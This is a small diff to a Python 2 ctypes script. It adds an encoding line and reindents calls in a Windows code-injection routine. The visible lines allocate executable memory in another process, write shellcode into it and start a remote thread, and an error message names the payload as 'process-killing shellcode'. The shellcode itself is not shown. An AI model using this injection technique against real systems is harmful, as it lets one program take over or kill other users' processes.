@@ -1,3 +1,4 @@
+#-*- coding: utf-8 -*-
 import sys
 from ctypes import *
 
@@ -39,15 +40,15 @@ if not h_process:
 		sys.exit(0)
 
 arg_address =kernel32.VirtualAllocEx(h_process,0,code_size, \
-																		 VIRTUAL_MEM , PAGE_EXECUTE_READWRITE)
+					 VIRTUAL_MEM , PAGE_EXECUTE_READWRITE)
 
 written = c_int(0)
 kernel32.WriteProcessMemory(h_process,arg_address,shellcode,\
-														code_size,byref(written))
+				code_size,byref(written))
 
 thread_id = c_ulong(0)
-if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,\
-																		None,0,byref(thread_id)):
+if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address,\
+					None, 0, byref(thread_id)):
 		print "[*] Failed to inject process-killing shellcode. Exiting."
 		sys.exit(0)
 
